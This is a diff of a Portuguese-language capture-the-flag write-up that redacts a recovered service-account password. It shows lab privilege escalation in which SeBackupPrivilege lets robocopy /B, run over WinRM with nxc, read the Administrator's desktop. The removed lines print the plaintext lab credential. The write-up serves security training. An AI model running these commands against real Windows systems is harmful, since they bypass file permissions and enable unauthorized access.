@@ -142,15 +142,15 @@ A saída tem 48 bytes e a estrutura importa:
 02 02                     padding do bloco AES
 ```
 
-Ler até o fim do bloco e converter tudo para UTF-16LE adiciona um `U+0202` no fim da senha. Foi exatamente esse caractere que queimou as primeiras tentativas de login. Com o recorte certo, a senha é `W0rldTr@cer_B@ckup1`.
+Ler até o fim do bloco e converter tudo para UTF-16LE adiciona um `U+0202` no fim da senha. Foi exatamente esse caractere que queimou as primeiras tentativas de login. Com o recorte certo, a senha do `svc_wtbackup` sai inteira (omitida aqui).
 
 ## Root
 
 `Backup Operators` concede `SeBackupPrivilege`, que ignora ACL do NTFS quando o processo pede semântica de backup. O `robocopy /B` faz exatamente isso:
 
 ```bash
-nxc winrm 10.129.26.50 -u svc_wtbackup -p 'W0rldTr@cer_B@ckup1' --local-auth
-nxc winrm 10.129.26.50 -u svc_wtbackup -p 'W0rldTr@cer_B@ckup1' --local-auth \
+nxc winrm 10.129.26.50 -u svc_wtbackup -p '<redacted>' --local-auth
+nxc winrm 10.129.26.50 -u svc_wtbackup -p '<redacted>' --local-auth \
   -x 'cmd /c robocopy C:\Users\Administrator\Desktop C:\Users\svc_wtbackup\Documents root.txt /B'
 ```
 
